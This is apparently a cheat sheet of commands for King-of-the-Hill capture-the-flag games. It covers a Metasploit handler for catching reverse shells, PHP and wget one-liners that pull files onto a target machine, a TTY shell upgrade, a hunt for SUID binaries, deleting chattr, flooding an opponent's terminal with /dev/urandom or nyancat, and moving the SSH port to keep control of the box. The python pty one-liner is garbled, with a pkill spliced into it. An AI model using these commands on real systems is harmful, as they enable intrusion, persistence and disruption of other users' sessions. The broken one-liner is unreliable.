                                                   <Tricks-For-All-Things>

# if you need (sure will) to install "chattr" on a machine here's a gift: 

```
https://github.com/Macchimne/Chattr-for-Koth
```

# if you want to create a simple web server in python (generally to download or install something from machine to machine): 

```
python3 -m http.server <port>
```

# if you need to see open ports:

```
netstat -anpt
```

# Download files using php:

```
php -r "copy('https://endereco.com/arquivo.txt','nome_do_arquivo_na_maquina.txt');"

```

```
# receive connections by metasploit:
```
```
use exploit/multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 127.0.0.1
set LPORT 8080
set ExitOnSession false
exploit -j
```

# if you need to install python without root:
```
wget https://www.python.org/ftp/python/3.9.9/Python-3.9.9.tgz
```
```
tar -zxvf Python-3.9.9.tgz
cd Python-3.9.9.tgz
mkdir ~/.localpython
./configure --prefix=/home/$(whoami)/.localpython
make;make install
```

# a fully tty shell:

```
python3 -c"pkill -9 -t pts/ 'import pty;pty.spawn("/bin/bash")'

"ctrl + z"

stty raw -echo && fg

aperte "enter" novamente

export TERM=xterm-256color
```

# Search Suid's:
```
find / -perm -u=s -ls 2>/dev/null > /tmp/.find &
```

# delete chattr:
```
rm -rf /usr/bin/chattr
  ```
# Find Flags:
```
find / -name flags

# Nyan-cat:
git clone https://github.com/klange/nyancat
cd nyancat/src
make
## Sending Nyancat to machine:
python -m SimpleHTTPServer 80 # on your local machine

wget http://yourip/nyancat # on the KOTH machine

chmod +x nyancat

./nyancat > /dev/pts/#  < here where is the # you will place the enemy PTS
```
# Breaking pts by sending spam from urandom
```
cat /dev/urandom > /dev/pts/#
```
# Changing the ssh port:
```
nano /etc/ssh/sshd_config

Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key
by default the SSH port is port 22, but you can change this port for example
Include /etc/ssh/sshd_config.d/*.conf

Port 55999
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key
service sshd restart
```
//and ready after restarting the SSH service the SSH port will be at 55999
